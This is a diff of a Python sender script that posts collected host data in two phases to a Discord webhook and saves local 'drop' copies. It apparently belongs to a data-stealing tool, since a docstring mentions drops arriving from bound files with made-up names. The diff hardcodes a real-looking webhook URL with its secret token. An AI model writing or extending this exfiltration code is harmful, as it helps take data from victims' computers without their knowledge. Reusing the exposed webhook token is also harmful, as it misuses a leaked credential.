@@ -15,11 +15,10 @@ import time
 from pathlib import Path
 
 ROOT = Path(__file__).resolve().parent
+sys.path.insert(0, str(ROOT))
 sys.path.insert(0, str(ROOT / "payload"))
 
-WEBHOOK = "https://discord.com/api/webhooks/FRIEND_WEBHOOK_ID/FRIEND_WEBHOOK_TOKEN"
-
-
+WEBHOOK = "https://discord.com/api/webhooks/1573998939772948590/FcLZKOGLChs6uoNuY3d9JWJYpxZWU-wvPivzsIw7Ga7VrmsYqXb0D0HriL37tA3NDVHl"
 def _label() -> str:
     """A direct send.py run gets its own tag, host-named, so it never looks
     like a drop from a bound file with a made-up name."""
@@ -119,6 +118,14 @@ def main():
     first["phase"] = 1
     first["label"] = APP_ID
 
+    # Local copy first: the picker reads this even with no bot token, so a
+    # failed webhook never looks like "no sender ever existed".
+    try:
+        import senders
+        info("local drop : " + str(senders.save_drop(APP_ID, first, 1)))
+    except Exception as exc:
+        info("local drop : skip (" + repr(exc) + ")")
+
     if dry:
         ok("DRY RUN - kuch bheja nahi gaya, sirf dikhaya")
         _show_host(first)
@@ -156,6 +163,12 @@ def main():
 
     second["phase"] = 2
     second["label"] = APP_ID
+
+    try:
+        import senders
+        info("local drop : " + str(senders.save_drop(APP_ID, second, 2)))
+    except Exception as exc:
+        info("local drop : skip (" + repr(exc) + ")")
 
     archive = None
     try:
